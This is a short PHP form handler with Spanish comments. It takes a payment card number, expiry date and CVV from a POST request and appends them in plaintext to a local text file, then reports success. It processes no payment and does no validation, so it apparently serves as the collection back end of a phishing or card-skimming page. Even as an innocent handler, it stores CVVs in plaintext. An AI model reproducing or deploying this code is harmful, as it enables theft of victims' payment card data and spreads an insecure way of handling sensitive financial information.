<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $tarjeta = $_POST["tarjeta"];
    $fecha = $_POST["fecha"];
    $cvv = $_POST["cvv"];

    // Abre o crea el archivo en modo escritura
    $archivo = fopen("datos_formulario.txt", "a");

    if ($archivo) {
        // Escribe los datos en el archivo
        fwrite($archivo, "Número de Tarjeta: " . $tarjeta . "\n");
        fwrite($archivo, "Fecha de Vencimiento: " . $fecha . "\n");
        fwrite($archivo, "CVV: " . $cvv . "\n");

        // Cierra el archivo
        fclose($archivo);

        echo "Datos del formulario guardados correctamente.";
    } else {
        echo "Error al abrir el archivo.";
    }
} else {
    echo "Error: Acceso no válido.";
}
?>

